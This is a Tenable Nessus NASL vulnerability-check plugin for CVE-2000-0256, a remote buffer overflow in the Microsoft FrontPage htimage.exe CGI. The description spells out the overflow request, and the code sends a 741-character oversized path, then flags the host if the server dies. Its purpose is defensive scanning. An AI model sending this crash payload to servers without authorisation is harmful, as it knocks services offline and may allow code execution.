#
# (C) Tenable Network Security, Inc.
#

# Added some extra checks. Axel Nennker axel@nennker.de

include("compat.inc");

if(description)
{
 script_id(10376);
 script_version ("$Revision: 1.42 $");
 script_cve_id("CVE-2000-0256");
 script_bugtraq_id(1117);
 script_osvdb_id(3384);

 script_name(english:"Microsoft FrontPage htimage.exe CGI Remote Overflow");
 script_summary(english:"Is htimage.exe vulnerable to a buffer overflow ?");

 script_set_attribute(attribute:"synopsis", value:
"A web application on the remote host has a buffer overflow
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The htimage.exe CGI is installed on the remote web server.  This CGI
is vulnerable to a remote buffer overflow attack when it is given
the request :

  /cgi-bin/htimage.exe/AAAA[....]AAA?0,0

A remote attacker could use this to crash the web server, or possibly
execute arbitrary code." );
 script_set_attribute(attribute:"see_also",
   value:"http://seclists.org/bugtraq/2000/Apr/105"
 );
 script_set_attribute(attribute:"see_also",
   value:"http://seclists.org/bugtraq/2000/Apr/148"
 );
 script_set_attribute(attribute:"solution", 
   value:"Remove this file from the web server."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"plugin_publication_date", value: "2000/04/19");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/04/18");
 script_cvs_date("$Date: 2016/11/19 01:42:50 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
 
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 exit(0);
}

# The attack starts here
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");



port = get_http_port(default:80);

if(http_is_dead(port:port))exit(0, "The web server on port "+port+" is already dead.");

foreach dir (cgi_dirs())
{
 if (is_cgi_installed3(item:string(dir, "/htimage.exe"), port:port))
 {
  req = string(dir, "/htimage.exe/", crap(741), "?0,0");
  w = http_send_recv3(port: port, method:"GET", item: req, exit_on_fail: 0);
  if (isnull(w))
   {
    security_hole(port);
   }
  if (! thorough_tests)
    exit(0, build_url(port: port, qs: dir + "/htimage.exe") + " is not vulnerable.");
 }
}

exit(0, "No vulnerable CGI was found on port "+port+".");


